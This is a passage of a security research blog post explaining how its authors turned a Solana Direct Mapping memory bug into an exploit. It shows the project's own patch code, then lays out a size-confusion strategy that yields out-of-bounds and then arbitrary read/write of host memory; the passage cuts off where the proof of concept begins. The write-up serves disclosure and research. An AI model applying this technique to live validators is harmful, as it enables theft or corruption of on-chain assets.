</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">66</span><span>    </span><span class="token token" style="color:#f8c555">Ok</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">67</span><span></span><span class="token token" style="color:#ccc">}</span></code></div></pre>
<p class="text-xl py-3 text-pretty sm:text-justify">However, once we pulled the latest code, our PoC stopped working. How so?</p>
<p class="text-xl py-3 text-pretty sm:text-justify">Coincidentally, Solana was actively patching another bug while we were developing our PoC. We originally thought the patch was irrelevant to our bug, but it ended up blocking our first exploit.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">The patch addresses a mistake where <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code> states are not updated properly across CPIs. That fix landed in <a class="text-accent1 hover:text-indigo-300 underline decoration-1 underline-offset-4" target="_blank" rel="noopener noreferrer" href="https://github.com/solana-labs/solana/pull/32649/commits/9788a4efffdb1436bdcb5f0891111398d5a4da0b">this commit</a>. The main addition of the patch is shown below.</p>
<pre><div class="rounded-sm" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-rust" style="white-space:pre;color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">1</span><span class="token token" style="color:#cc99cd">fn</span><span> </span><span class="token token function-definition" style="color:#f08d49">update_caller_account_perms</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">2</span><span>    memory_mapping</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">MemoryMapping</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">3</span><span>    caller_account</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">CallerAccount</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">4</span><span>    callee_account</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">BorrowedAccount</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;_</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">5</span><span>    is_loader_deprecated</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">bool</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">6</span><span></span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">-&gt;</span><span> </span><span class="token token" style="color:#f8c555">Result</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f8c555">Error</span><span class="token token" style="color:#67cdcc">&gt;</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">7</span><span>    </span><span class="token token" style="color:#cc99cd">let</span><span> </span><span class="token token" style="color:#f8c555">CallerAccount</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">8</span><span>        original_data_len</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">9</span><span>        vm_data_addr</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">10</span><span>        </span><span class="token token" style="color:#ccc">..</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">11</span><span>    </span><span class="token token" style="color:#ccc">}</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> caller_account</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">12</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">13</span><span>    </span><span class="token token" style="color:#cc99cd">let</span><span> data_region </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#f08d49">account_data_region</span><span class="token token" style="color:#ccc">(</span><span>memory_mapping</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span>vm_data_addr</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span>original_data_len</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#67cdcc">?</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">14</span><span>    </span><span class="token token" style="color:#cc99cd">if</span><span> </span><span class="token token" style="color:#cc99cd">let</span><span> </span><span class="token token" style="color:#f8c555">Some</span><span class="token token" style="color:#ccc">(</span><span>region</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> data_region </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">15</span><span>        </span><span class="token token" style="color:#cc99cd">match</span><span> </span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">16</span><span>            region</span><span class="token token" style="color:#ccc">.</span><span>state</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">get</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">17</span><span>            callee_account</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">can_data_be_changed</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">is_ok</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">18</span><span>        </span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">19</span><span>            </span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f8c555">MemoryState</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Readable</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f08d49">true</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">=&gt;</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">20</span><span>                </span><span class="token token" style="color:#999">// If the account is still shared it means it wasn&#x27;t written to yet during this</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">21</span><span>                </span><span class="token token" style="color:#999">// transaction. We map it as CoW and it&#x27;ll be copied the first time something</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">22</span><span>                </span><span class="token token" style="color:#999">// tries to write into it.</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">23</span><span>                </span><span class="token token" style="color:#cc99cd">if</span><span> callee_account</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">is_shared</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">24</span><span>                    </span><span class="token token" style="color:#cc99cd">let</span><span> index_in_transaction </span><span class="token token" style="color:#67cdcc">=</span><span> callee_account</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">get_index_in_transaction</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">25</span>                    region
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">26</span><span>                        </span><span class="token token" style="color:#ccc">.</span><span>state
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">27</span><span>                        </span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">set</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f8c555">MemoryState</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Cow</span><span class="token token" style="color:#ccc">(</span><span>index_in_transaction </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">28</span><span>                </span><span class="token token" style="color:#ccc">}</span><span> </span><span class="token token" style="color:#cc99cd">else</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">29</span><span>                    region</span><span class="token token" style="color:#ccc">.</span><span>state</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">set</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f8c555">MemoryState</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Writable</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">30</span><span>                </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">31</span><span>            </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">32</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">33</span><span>            </span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f8c555">MemoryState</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Writable</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#f8c555">MemoryState</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Cow</span><span class="token token" style="color:#ccc">(</span><span>_</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f08d49">false</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">=&gt;</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">34</span><span>                region</span><span class="token token" style="color:#ccc">.</span><span>state</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">set</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f8c555">MemoryState</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Readable</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">35</span><span>            </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">36</span><span>            _ </span><span class="token token" style="color:#67cdcc">=&gt;</span><span> </span><span class="token token" style="color:#ccc">{</span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">37</span><span>        </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">38</span><span>    </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">39</span><span>    </span><span class="token token" style="color:#cc99cd">let</span><span> realloc_region </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#f08d49">account_realloc_region</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">40</span><span>        memory_mapping</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">41</span><span>        </span><span class="token token" style="color:#67cdcc">*</span><span>vm_data_addr</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">42</span><span>        </span><span class="token token" style="color:#67cdcc">*</span><span>original_data_len</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">43</span><span>        is_loader_deprecated</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">44</span><span>    </span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#67cdcc">?</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">45</span><span>    </span><span class="token token" style="color:#cc99cd">if</span><span> </span><span class="token token" style="color:#cc99cd">let</span><span> </span><span class="token token" style="color:#f8c555">Some</span><span class="token token" style="color:#ccc">(</span><span>region</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> realloc_region </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">46</span>        region
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">47</span><span>            </span><span class="token token" style="color:#ccc">.</span><span>state
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">48</span><span>            </span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">set</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#cc99cd">if</span><span> callee_account</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">can_data_be_changed</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">is_ok</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">49</span><span>                </span><span class="token token" style="color:#f8c555">MemoryState</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Writable</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">50</span><span>            </span><span class="token token" style="color:#ccc">}</span><span> </span><span class="token token" style="color:#cc99cd">else</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">51</span><span>                </span><span class="token token" style="color:#f8c555">MemoryState</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Readable</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">52</span><span>            </span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">53</span><span>    </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">54</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">55</span><span>    </span><span class="token token" style="color:#f8c555">Ok</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">56</span><span></span><span class="token token" style="color:#ccc">}</span></code></div></pre>
<p class="text-xl py-3 text-pretty sm:text-justify">The idea of the patch is that when a CPI happens, changes to the <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">owner</code> of an account may be updated and flushed to <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">TransactionContext</code>. One example of this is when creating a new token account. The caller is expected to transfer ownership of an empty account to the token program, and the token program will then initialize the token account with relevant data. Obviously we should no longer allow the caller program to directly write the token account data after the token program has taken ownership of it. With Direct Mapping enabled, this means <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code> state must be updated accordingly.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">At first glance, the patch seemed unrelated to our finding. But unfortunately, updating <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">state</code> means that while we may point the host pointer of an originally writable <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code> to some unwritable account data, after CPI finishes, the <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code> will just end up being marked as readonly. This kills our exploit.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">Still, <strong>the vulnerability itself hadn&#x27;t been patched</strong>. We just need to bypass the new checks, and that is exactly what we, Anatomist Security, are best at. With years of deep security research and CTF experience, we specialize in turning dead ends into breakthroughs.</p>
<h2 class="text-4xl py-4 border-b border-white/10">New Exploitation Strategy</h2>
<p class="text-xl py-3 text-pretty sm:text-justify">So back to the drawing board, what else can we do with our bug? The essence of the bug is confusion of <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion.host_addr</code>. In other words, we could overwrite an arbitrary <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code>&#x27;s <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">host_addr</code> with another <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code>&#x27;s <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">host_addr</code>.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">While our first attempt was to change the <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">host_addr</code> of a writable <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code> to some readonly account data buffer, it is definitely not the only way to wield the bug. Our second idea is, instead of trying to write to a readonly account data buffer, what if we changed the <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">host_addr</code> of a writable <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code> to the backing buffer of another writable <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code> that has a different length?</p>
<h3 class="text-3xl py-4 border-b border-white/10">The New Attack Vector: Size Confusion</h3>
<p class="text-xl py-3 text-pretty sm:text-justify">This new idea led us to a completely different exploitation approach. Instead of trying to bypass permission checks, we could exploit size differences between different account buffers for out-of-bound read/write, a primitive commonly used in binary exploitation.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">Consider two accounts, both writable by the attacker:</p>
<ul class="text-xl py-2 text-pretty sm:text-justify" style="display:block;list-style-type:disc;padding-inline-start:40px">
<li><strong>SWAP</strong>: A small-sized buffer account with data length 0x100</li>
<li><strong>LEVERAGE</strong>: A bigger-sized buffer account, with data length 0x400, whose <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">host_addr</code> will be replaced to SWAP&#x27;s <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">host_addr</code></li>
</ul>
<p class="text-xl py-3 text-pretty sm:text-justify">If we could make <strong>LEVERAGE</strong> account&#x27;s <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code> point to <strong>SWAP</strong> account&#x27;s buffer, by accessing <strong>LEVERAGE</strong> account&#x27;s virtual memory, we ends up touching <strong>SWAP</strong> account&#x27;s data buffer on the host. Since the <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code> of <strong>LEVERAGE</strong> has a size of 0x400, larger than the size of the underlying host buffer of <strong>SWAP</strong>, once we go past the first 0x100 bytes of <strong>LEVERAGE</strong>&#x27;s virtual memory, it will map beyond the end of the <strong>SWAP</strong> data buffer. This gives us out-of-bounds read/write primitive on host memory.</p>
<h3 class="text-3xl py-4 border-b border-white/10">From Limited OOB to Arbitrary read/write</h3>
<p class="text-xl py-3 text-pretty sm:text-justify">With this, we gain out-of-bounds read/write access to 0x300 bytes (0x400 - 0x100) after <strong>SWAP</strong>&#x27;s data buffer in host memory. However, this primitive is limited to a specific range. We need to make it more powerful.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">The idea is straightforward: since <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code> structures also reside in host memory, we can scan the out-of-bounds region to locate other <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code> structures. By modifying their <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">host_addr</code> fields to point to our target addresses, accessing the corresponding virtual memory provides arbitrary read/write access to those target addresses. We just need to spray a lot of writable accounts and make the size difference larger to increase the success rate.</p>
<h2 class="text-4xl py-4 border-b border-white/10">Proof-of-Concept</h2>
<p class="text-xl py-3 text-pretty sm:text-justify">Now, let&#x27;s take a deep dive into a PoC of how to exploit this vulnerability from the ground up.</p>
<h3 class="text-3xl py-4 border-b border-white/10">Detailed Attack Steps</h3>
<p class="text-xl py-3 text-pretty sm:text-justify">The exploit requires three specific accounts with distinct purposes:</p>
<ul class="text-xl py-2 text-pretty sm:text-justify" style="display:block;list-style-type:disc;padding-inline-start:40px">
